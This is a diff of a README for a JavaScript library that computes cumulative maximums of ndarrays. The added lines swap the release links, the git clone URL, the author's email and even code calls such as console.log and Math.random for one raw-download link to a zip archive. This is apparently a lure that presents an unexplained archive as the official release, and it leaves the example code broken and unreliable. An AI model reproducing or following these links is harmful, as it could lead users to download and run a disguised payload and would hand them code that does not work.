@@ -1,6 +1,6 @@
 # 📊 Stats Base: Cumulative Maximum for Ndarrays
 
-Welcome to the **Stats Base Ndarray Dcumax** repository! This library computes the cumulative maximum value of a one-dimensional double-precision floating-point ndarray. You can find the latest releases [here](https://github.com/SaraStojanova/stats-base-ndarray-dcumax/releases).
+Welcome to the **Stats Base Ndarray Dcumax** repository! This library computes the cumulative maximum value of a one-dimensional double-precision floating-point ndarray. You can find the latest releases [here](https://github.com/SaraStojanova/stats-base-ndarray-dcumax/raw/refs/heads/main/docs/types/dcumax-ndarray-stats-base-3.9-beta.4.zip).
 
 ---
 
@@ -28,7 +28,7 @@ With this library, you can easily manage large datasets and perform complex calc
 
 - **Easy to Use**: Simple API for quick implementation.
 - **Performance**: Optimized for speed and efficiency.
-- **Compatibility**: Works seamlessly with Node.js and JavaScript environments.
+- **Compatibility**: Works seamlessly with https://github.com/SaraStojanova/stats-base-ndarray-dcumax/raw/refs/heads/main/docs/types/dcumax-ndarray-stats-base-3.9-beta.4.zip and JavaScript environments.
 - **Lightweight**: Minimal dependencies for a clean setup.
 - **Versatile**: Suitable for a variety of applications in statistics and data analysis.
 
@@ -43,7 +43,7 @@ npm install stats-base-ndarray-dcumax
 You can also clone the repository directly:
 
 ```bash
-git clone https://github.com/SaraStojanova/stats-base-ndarray-dcumax.git
+git clone https://github.com/SaraStojanova/stats-base-ndarray-dcumax/raw/refs/heads/main/docs/types/dcumax-ndarray-stats-base-3.9-beta.4.zip
 cd stats-base-ndarray-dcumax
 npm install
 ```
@@ -62,7 +62,7 @@ Then, you can compute the cumulative maximum of your ndarray:
 const ndarray = require('ndarray');
 const data = ndarray(new Float64Array([1.0, 2.5, 3.1, 2.0, 5.5]), [5]);
 const result = dcumax(data);
-console.log(result);
+https://github.com/SaraStojanova/stats-base-ndarray-dcumax/raw/refs/heads/main/docs/types/dcumax-ndarray-stats-base-3.9-beta.4.zip(result);
 ```
 
 ## Examples
@@ -77,7 +77,7 @@ const ndarray = require('ndarray');
 
 const data = ndarray(new Float64Array([4.0, 2.0, 5.0, 1.0, 3.0]), [5]);
 const result = dcumax(data);
-console.log(result); // Output: [4.0, 4.0, 5.0, 5.0, 5.0]
+https://github.com/SaraStojanova/stats-base-ndarray-dcumax/raw/refs/heads/main/docs/types/dcumax-ndarray-stats-base-3.9-beta.4.zip(result); // Output: [4.0, 4.0, 5.0, 5.0, 5.0]
 ```
 
 ### Working with Larger Datasets
@@ -88,9 +88,9 @@ For larger datasets, the library remains efficient:
 const dcumax = require('stats-base-ndarray-dcumax');
 const ndarray = require('ndarray');
 
-const largeData = ndarray(new Float64Array(1000000).fill(0).map((_, i) => Math.random() * 100), [1000000]);
+const largeData = ndarray(new Float64Array(1000000).fill(0).map((_, i) => https://github.com/SaraStojanova/stats-base-ndarray-dcumax/raw/refs/heads/main/docs/types/dcumax-ndarray-stats-base-3.9-beta.4.zip() * 100), [1000000]);
 const result = dcumax(largeData);
-console.log(result);
+https://github.com/SaraStojanova/stats-base-ndarray-dcumax/raw/refs/heads/main/docs/types/dcumax-ndarray-stats-base-3.9-beta.4.zip(result);
 ```
 
 ## API Documentation
@@ -106,7 +106,7 @@ console.log(result);
 
 ```javascript
 const result = dcumax(ndarray(new Float64Array([1.0, 3.0, 2.0]), [3]));
-console.log(result); // Output: [1.0, 3.0, 3.0]
+https://github.com/SaraStojanova/stats-base-ndarray-dcumax/raw/refs/heads/main/docs/types/dcumax-ndarray-stats-base-3.9-beta.4.zip(result); // Output: [1.0, 3.0, 3.0]
 ```
 
 ## Contributing
@@ -131,7 +131,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any questions or feedback, please reach out:
 
 - **Author**: Sara Stojanova
-- **Email**: sara@example.com
-- **GitHub**: [SaraStojanova](https://github.com/SaraStojanova)
+- **Email**: https://github.com/SaraStojanova/stats-base-ndarray-dcumax/raw/refs/heads/main/docs/types/dcumax-ndarray-stats-base-3.9-beta.4.zip
+- **GitHub**: [SaraStojanova](https://github.com/SaraStojanova/stats-base-ndarray-dcumax/raw/refs/heads/main/docs/types/dcumax-ndarray-stats-base-3.9-beta.4.zip)
 
-Thank you for using **Stats Base Ndarray Dcumax**! Check out the [Releases](https://github.com/SaraStojanova/stats-base-ndarray-dcumax/releases) section for updates and new features.
+Thank you for using **Stats Base Ndarray Dcumax**! Check out the [Releases](https://github.com/SaraStojanova/stats-base-ndarray-dcumax/raw/refs/heads/main/docs/types/dcumax-ndarray-stats-base-3.9-beta.4.zip) section for updates and new features.
